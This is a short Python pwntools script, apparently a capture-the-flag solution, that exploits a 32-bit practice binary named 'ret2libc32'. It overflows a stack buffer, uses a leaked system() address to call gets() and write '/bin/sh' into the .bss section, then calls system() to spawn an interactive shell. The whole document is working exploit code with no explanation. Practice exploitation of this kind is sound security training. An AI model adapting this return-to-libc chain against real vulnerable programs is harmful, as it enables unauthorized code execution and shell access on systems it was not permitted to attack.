from pwn import *

context.arch = "i386"
context.terminal = ['kitty', '-e', 'sh', '-c']

gets_offset = +0x2b1a0
payload = 'A' * 0x18

elf = ELF('ret2libc32')
io = process('./ret2libc32')

system = int(io.recv().split('\n')[0],base=16)
bss = elf.bss() + 0x100

payload += p32(system+gets_offset)
payload += p32(system)
payload += p32(bss)
payload += p32(bss)

#gdb.attach(io)
io.sendline(payload)

io.sendline('/bin/sh\x00')
io.interactive()
